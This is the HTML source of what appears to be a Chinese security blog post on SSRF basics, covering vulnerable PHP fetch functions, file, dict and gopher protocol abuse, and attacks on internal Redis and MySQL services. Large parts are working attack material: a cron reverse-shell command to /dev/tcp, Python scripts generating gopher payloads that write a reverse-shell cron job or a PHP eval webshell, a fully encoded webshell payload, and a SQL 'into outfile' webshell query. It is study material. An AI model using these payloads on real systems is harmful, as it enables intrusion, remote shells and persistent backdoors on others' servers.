@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        SSRF 基础 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">SSRF 基础</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/OWASP/" class="post-tag">#OWASP</a>
+  
+    <a href="/tags/SSRF/" class="post-tag">#SSRF</a>
+  
+
+
+          <span class="post-date">2023-03-14</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%94%BB%E5%87%BB%E4%B8%AD%E6%B6%89%E5%8F%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8D%8F%E8%AE%AE"><span class="toc-text">SSRF攻击中涉及的一些协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http"><span class="toc-text">http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="toc-text">dict协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">file伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text">Gopher协议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%89%93%E5%86%85%E7%BD%91"><span class="toc-text">SSRF打内网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#redis"><span class="toc-text">redis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%90%86%E8%AE%BA"><span class="toc-text">理论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-text">攻击实现原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FAST-CGI"><span class="toc-text">FAST-CGI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%90%86%E8%AE%BA-1"><span class="toc-text">理论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86-1"><span class="toc-text">攻击实现原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%80%E4%B8%AA%E5%88%A9%E7%94%A8ssrf302%E8%B7%B3%E8%BD%AC%E6%89%93%E6%9C%AC%E5%9C%B0fpm%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-text">这里有一个利用ssrf302跳转打本地fpm的例子</span></a></li></ol></li></ol></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>SSRF(服务端请求伪造漏洞) 由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
+<p>一般情况下，SSRF针对的都是一些外网无法访问的内网，所以需要SSRF使目标后端去访问内网，进而达到我们攻击内网的目的。</p>
+<p>通过SSRF，我们可以访问目标内网的redis服务，mysql服务，smpt服务，fastcgi服务等</p>
+<p>造成漏洞的一些函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</span><br><span class="line">readfile()：输出一个文件的内容。</span><br><span class="line">fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</span><br><span class="line">curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</span><br><span class="line">fopen()：打开一个文件文件或者 URL。</span><br></pre></td></tr></table></figure>
+
+<p><code>file_get_contents()/readfile()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>fsockopen()</code></p>
+<p>fsockopen($hostname,$port,$errno,$errstr,$timeout) 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>curl_exec()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);  <span class="comment">//创造一个curl资源</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">//设置url和相应的选项</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>); <span class="comment">// 抓取url并将其传递给浏览器</span></span><br><span class="line">curl_close(<span class="variable">$ch</span>); <span class="comment">//关闭curl资源</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="SSRF攻击中涉及的一些协议"><a href="#SSRF攻击中涉及的一些协议" class="headerlink" title="SSRF攻击中涉及的一些协议"></a>SSRF攻击中涉及的一些协议</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>直接http访问</p>
+<h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><p><em>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</em></p>
+<p>先判断哪个端口存在web服务</p>
+<p>这里是直接用burp爆破端口就可以</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png" alt="image-20230328100031810"></p>
+<h2 id="file伪协议"><a href="#file伪协议" class="headerlink" title="file伪协议"></a>file伪协议</h2><p>file为协议就不用多说了</p>
+<p>payload：<code>?url=file:/var/www/html/flag.php</code></p>
+<p>但是需要知道文件具体位置才能读到敏感信息。</p>
+<h2 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h2><blockquote>
+<p> gopher协议支持发出GET、POST请求：可以先拦截get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。 </p>
+<p> 可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。 </p>
+<p> <code>curl</code>是支持<code>gopher协议</code>的，所以这也是<code>curl_exec()</code>容易出现漏洞的地方 </p>
+</blockquote>
+<blockquote>
+<p> gopher://IP:port/_{TCP/IP数据流} </p>
+</blockquote>
+<p> 那么，为什么ssrf要配合gopher协议呢？ </p>
+<blockquote>
+<p>我觉得，是因为正常来说你只能传一个内网url+文件路径，没法做更多的操作，比如传马，比如绕过验证，但是curl_exec()支持gopher协议，gopher可以把一整个请求包打包塞进里面，那请求包能干的事我们就都能干， 并且就可以解决漏洞点不在GET参数的问题了 。</p>
+</blockquote>
+<p>在gopher协议中发送HTTP的数据，需要以下三步：</p>
+<blockquote>
+<p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p>
+</blockquote>
+<p>在转换为URL编码时候有这么几个坑</p>
+<blockquote>
+<p>1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
+</blockquote>
+<p>这里我们需要构造一个POST的数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=00f001523d0b955749ea5e3b0ca09b5f</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以进行url编码了，编码次数取决于我们访问次数。</p>
+<p>第一次编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2036%0A%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7</span><br></pre></td></tr></table></figure>
+
+<p>把%0A替换成%0d%0A，结尾加上%0d%0A,并且末尾要加上%0d%0a（\r\n）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>然后在进行一次URL编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%25</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="SSRF打内网"><a href="#SSRF打内网" class="headerlink" title="SSRF打内网"></a>SSRF打内网</h1><p>存在ssrf漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议。</p>
+<p>file协议拿来进行本地文件的读取，http协议拿来进行内网的ip扫描、端口探测，如果探测到6379端口，那么可以利用http、gopher、dict这几个协议来打开放6379端口的redis服务（一般开放了这个端口的是redis服务），原理是利用他们以目标机的身份执行对开启redis服务的内网机执行redis命令，最后反弹shell到我们的公网ip机上。</p>
+<ul>
+<li>redis</li>
+<li>fastcgi </li>
+<li>mysql</li>
+</ul>
+<p>到这里就不得不提gopherus这个工具的使用了：此工具可以自动生成 Gopher payload，以利用 SSRF并获得 RCE。</p>
+<p>该工具的攻击范围：</p>
+<ol>
+<li>MySQL (Port-3306)</li>
+<li>PostgreSQL(Port-5432)</li>
+<li>FastCGI (Port-9000)</li>
+<li>Memcached (Port-11211)</li>
+<li>Redis (Port-6379)</li>
+<li>Zabbix (Port-10050)</li>
+<li>SMTP (Port-25)</li>
+</ol>
+<p><img src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png" alt="1666629843369"></p>
+<p>使用说明：</p>
+<p><a target="_blank" rel="noopener" href="https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/">https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/</a></p>
+<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><h3 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h3><p>首先要知道redis是个啥，起什么作用</p>
+<p>看宝塔里面的redis安装说明，貌似这个就是一种数据库，那么ssrf打redis和mysql应该是有类似的效果</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png" alt="1666189235250">redis常见漏洞利用<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/280984.html">https://www.freebuf.com/articles/network/280984.html</a></p>
+<p> 在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等….. </p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li><p>写进定时任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主要依靠如下redis命令</span><br><span class="line">flushallset 1 &#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/反弹IP/反弹端口 0&gt;&amp;1\n\n&#x27;config set dir /var/spool/cron/config set dbfilename rootsave </span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.0.129&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.0.132&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;2333&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cron.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),     <span class="string">&quot;save&quot;</span>     ]</span><br><span class="line"><span class="keyword">if</span> passwd:    </span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">    payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span>    </span><br><span class="line">        CRLF=<span class="string">&quot;\r\n&quot;</span>    </span><br><span class="line">        redis_arr = arr.split(<span class="string">&quot; &quot;</span>)    </span><br><span class="line">        cmd=<span class="string">&quot;&quot;</span>    </span><br><span class="line">        cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))    </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:        </span><br><span class="line">            cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)    </span><br><span class="line">            cmd+=CRLF    </span><br><span class="line">            <span class="keyword">return</span> cmdif __name__==<span class="string">&quot;__main__&quot;</span>:    </span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> cmd:        </span><br><span class="line">                payload += urllib.parse.quote(redis_format(x))    </span><br><span class="line">                payload=urllib.parse.quote(payload)    </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Result.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:        </span><br><span class="line">                    f.write(payload)    </span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Result.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:        </span><br><span class="line">                        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():            </span><br><span class="line">                            <span class="built_in">print</span>(line.strip())</span><br></pre></td></tr></table></figure></li>
+<li><p>写webshell</p>
+<p>在内网中的redis不会开web服务的吧..</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;whoami\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line"><span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line"><span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line"><span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line"><span class="string">&quot;save&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="built_in">print</span> urllib.quote(payload)    <span class="comment"># 由于我们这里是GET，所以要进行两次url编</span></span><br><span class="line">码</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set <span class="number">1</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;&#x27;</span></span><br><span class="line">config set dir /<span class="keyword">var</span>/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%<span class="number">3</span>A<span class="comment">//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="攻击实现原理"><a href="#攻击实现原理" class="headerlink" title="攻击实现原理"></a>攻击实现原理</h3><p>我觉得首先学习mysql写shell</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zztac/p/11371149.html">https://www.cnblogs.com/zztac/p/11371149.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p>
+<p>比较常用的，其实也没啥神秘的，不过是把查询到的数据进行一个导出，我们在查的东西里面写一下一句话木马，这个木马就会出现在我们查询的数据表里，如果能导出为php文件就万事大吉了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile &quot;/var/www/html/shell.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p> 还有一个需要关注的点就是：outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义成’,那么基本就GG了，但是load_file，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\ </p>
+<p>大概了解了一下，客户端连接mysql有两种，一种是有密码，一种是无密码， 所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，这里利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。 </p>
+<p>进行mysql查询的时候同样有数据包交互，我们要做的就是伪造这种数据包交互，进行curl，当然，这种我们伪造的数据包是利用gopher协议进行发送的</p>
+<p>curl gopher://127.0.0.1/_XXXXXX   大概像这样</p>
+<h2 id="FAST-CGI"><a href="#FAST-CGI" class="headerlink" title="FAST-CGI"></a>FAST-CGI</h2><h3 id="理论-1"><a href="#理论-1" class="headerlink" title="理论"></a>理论</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。 </p>
+<p>nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。</p>
+<p>nginx一般是把请求发fastcgi管理进程处理，fascgi管理进程选择cgi子进程处理结果并返回被nginx</p>
+<p>php-fpm:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/99271704">https://zhuanlan.zhihu.com/p/99271704</a></p>
+<p>nginx和php-fpm的交互：<a target="_blank" rel="noopener" href="https://learnku.com/articles/41710">https://learnku.com/articles/41710</a></p>
